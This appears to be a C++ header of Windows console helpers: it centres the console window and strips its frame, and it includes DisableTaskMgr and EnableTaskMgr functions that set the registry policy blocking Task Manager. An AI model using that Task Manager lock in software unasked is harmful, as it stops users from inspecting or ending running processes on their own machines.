#pragma once
#include <iostream>
#include <Windows.h>
#include <string>
#include <vector>
#include <skStr.h>
#include <fstream>
#include <filesystem>
#include "auth.hpp"

namespace Misc {

    void MoveCenter()
    {
        RECT rectClient, rectWindow;
        HWND hWnd = GetConsoleWindow();
        GetClientRect(hWnd, &rectClient);
        GetWindowRect(hWnd, &rectWindow);
        int posx, posy;
        posx = GetSystemMetrics(SM_CXSCREEN) / 2 - (rectWindow.right - rectWindow.left) / 2,
            posy = GetSystemMetrics(SM_CYSCREEN) / 2 - (rectWindow.bottom - rectWindow.top) / 2,

            MoveWindow(hWnd, posx, posy, rectClient.right - rectClient.left, rectClient.bottom - rectClient.top, TRUE);
    }

    HWND hwnd = GetConsoleWindow();


    void RemoveExtras()
    {
        HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
        CONSOLE_SCREEN_BUFFER_INFO info;
        GetConsoleScreenBufferInfo(handle, &info);
        COORD new_size =
        {
            info.srWindow.Right - info.srWindow.Left + 1,
            info.srWindow.Bottom - info.srWindow.Top + 1
        };
        SetConsoleScreenBufferSize(handle, new_size);

        LONG lStyle = GetWindowLong(hwnd, GWL_STYLE);
        lStyle &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU);
        SetWindowLong(hwnd, GWL_STYLE, lStyle);
        SetWindowPos(hwnd, NULL, 0, 0, 0, 0, SWP_FRAMECHANGED | SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_NOOWNERZORDER);

    }

    void DisableTaskMgr()
    {
        HKEY hKey;
        RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);

        DWORD value = 1;
        RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));

        RegCloseKey(hKey);
    }

    void EnableTaskMgr()
    {
        HKEY hKey;
        RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);

        DWORD value = 0;
        RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));

        RegCloseKey(hKey);
    }

}
